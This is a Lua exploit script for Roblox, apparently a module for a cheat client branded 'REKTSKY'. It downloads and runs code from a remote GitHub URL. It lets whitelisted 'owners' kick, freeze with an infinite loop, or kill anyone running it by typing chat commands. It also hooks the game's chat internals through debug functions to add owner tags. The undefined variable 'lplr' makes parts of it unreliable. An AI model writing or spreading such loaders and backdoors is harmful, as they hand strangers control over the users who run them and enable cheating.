local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/ExanlesLuashit/Vape-CustomModules/main/Whitelist.lua", true))()

local RunSerive = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local repstorage = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")

local function output(plr, msg)
	local player = game.Players[plr]
	print("player chatted: " .. msg)
	print(player.UserId)
	for i, v in pairs(whitelist.Owner) do
		if player.UserId == v then
			print("player is whitelisted")
			--if player ~= lplr then
			if string.lower(msg) == ";kick" then
				lplr:Kick()
			elseif string.lower(msg) == ";crash" then
				while true do  end

			elseif string.lower(msg) == ";kill" then
				lplr.Character.Humanoid.Health = 0
			end
			--end
		end
	end
end

local event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
event.OnMessageDoneFiltering.OnClientEvent:Connect(function(object)
	output(object.FromSpeaker, object.Message or "")
end)

task.spawn(function()


	local function runcode(func)
		func()
	end

	runcode(function()
		local oldchanneltab
		local oldchannelfunc
		local oldchanneltabs = {}

		if getconnections then
			for i,v in pairs(getconnections(repstorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
				if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
					oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
					oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
					getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
						local tab = oldchannelfunc(Self, Name)
						if tab and tab.AddMessageToChannel then
							local addmessage = tab.AddMessageToChannel
							if oldchanneltabs[tab] == nil then
								oldchanneltabs[tab] = tab.AddMessageToChannel
							end
							tab.AddMessageToChannel = function(Self2, MessageData)
								if MessageData.FromSpeaker and players[MessageData.FromSpeaker] then
									for i2, v2 in pairs(whitelist.Owner) do
										if players[MessageData.FromSpeaker].UserId == v2 then
											MessageData.ExtraData = {
												NameColor = players[MessageData.FromSpeaker].Team == nil and Color3.new(0, 1, 1) or players[MessageData.FromSpeaker].TeamColor.Color,
												Tags = {
													table.unpack(MessageData.ExtraData.Tags),
													{
														TagColor = Color3.new(1, 0.3, 0.3),
														TagText = "REKTSKY OWNER"
													}
												}
											}
										end
									end
									for i2, v2 in pairs(whitelist.Private) do
										if players[MessageData.FromSpeaker].UserId == v2 then
											MessageData.ExtraData = {
												NameColor = players[MessageData.FromSpeaker].Team == nil and Color3.new(0, 1, 1) or players[MessageData.FromSpeaker].TeamColor.Color,
												Tags = {
													table.unpack(MessageData.ExtraData.Tags),
													{
														TagColor = Color3.new(0.7, 0, 1),
														TagText = "REKTSKY PRIVATE"
													}
												}
											}
										end
									end
								end
								return addmessage(Self2, MessageData)
							end
						end
						return tab
					end
				end
			end
		end
	end)
end)
